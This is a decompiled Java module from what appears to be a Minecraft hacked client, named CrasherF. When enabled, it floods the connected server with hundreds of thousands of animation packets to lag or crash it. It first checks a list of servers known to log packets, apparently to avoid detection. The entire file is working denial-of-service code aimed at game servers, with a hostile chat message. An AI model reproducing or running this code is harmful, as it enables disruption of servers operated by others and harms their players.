/*
 * Decompiled with CFR 0_118.
 */
package it.nobusware.client.mods.crashers;

import QuarantineAPI.config.annotation.Handler;
import it.nobusware.client.events.EventUpdate;
import it.nobusware.client.manager.Module;
import it.nobusware.client.mods.FindPacketLog;
import it.nobusware.client.utils.ChatUtils;
import net.minecraft.network.play.client.C0APacketAnimation;

public class CrasherF extends Module {

	public CrasherF(String nome_mod, int tasto, String nome_array_printed, Category categoria) {
		super(nome_mod, tasto, nome_array_printed, categoria);
		setDangerous(true);
	}

	public static boolean active;
	int loop;

	@Handler
	public void onEvent(EventUpdate event) {
		if (!this.isAbilitato()) {
			return;
		}
		++this.loop;
		if (this.loop > 6) {
			int spam = 0;
			while (spam < 100000) {
				mc.getNetHandler().addToSendQueue(new C0APacketAnimation());
				++spam;
			}
			this.loop = 0;
			ChatUtils.print("Sending packets...");
		}
	}

	@Override
	public void Abilitato() {
		if(FindPacketLog.packetlog.contains(mc.getCurrentServerData().serverIP)) {
			ChatUtils.print("Questo Server Packetlogga!");
			this.toggle();
		}
		active = true;
		int spam = 0;
		while (spam < 200000) {
			mc.getNetHandler().addToSendQueue(new C0APacketAnimation());
			++spam;
		}
		ChatUtils.print("Trying to lag with method F ( FUCK THIS SERVER )");
	}

	@Override
	public void Disabilitato() {
		active = false;
	}
}